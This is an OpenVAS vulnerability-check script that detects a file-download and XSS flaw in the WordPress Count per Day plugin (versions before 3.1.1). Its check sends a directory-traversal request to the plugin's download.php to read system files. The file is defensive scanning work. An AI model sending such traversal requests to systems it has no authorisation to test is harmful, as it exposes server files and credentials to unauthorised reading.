###############################################################################
# OpenVAS Vulnerability Test
#
# WordPress Count per Day Plugin Arbitrary File Download and Cross Site Scripting Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103389");
  script_version("2023-03-01T10:20:04+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("WordPress Count per Day Plugin Arbitrary File Download and XSS Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51402");
  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/count-per-day/");

  script_tag(name:"last_modification", value:"2023-03-01 10:20:04 +0000 (Wed, 01 Mar 2023)");
  script_tag(name:"creation_date", value:"2012-01-13 10:18:15 +0100 (Fri, 13 Jan 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_tag(name:"solution_type", value:"VendorFix");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_wordpress_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");
  script_tag(name:"solution", value:"Vendor updates are available. Please see the references for details.");
  script_tag(name:"summary", value:"The WordPress plugin 'Count per Day' is prone to an arbitrary file download
and a cross-site scripting (XSS) vulnerability because they fail to
sufficiently sanitize user-supplied data.");

  script_tag(name:"impact", value:"Attackers may leverage these issues to download arbitrary files in the
context of the webserver process and execute arbitrary HTML and script
code in the browser of an unsuspecting user in the context of the
affected site. This may let the attacker steal cookie-based
authentication credentials and launch other attacks.");

  script_tag(name:"affected", value:"WordPress Count per Day versions prior to 3.1.1 are vulnerable.");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {

  url = string(dir, "/wp-content/plugins/count-per-day/download.php?n=1&f=", crap(data:"../", length:6*9), files[file]);
  if(http_vuln_check(port:port, url:url, pattern:file)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(0);
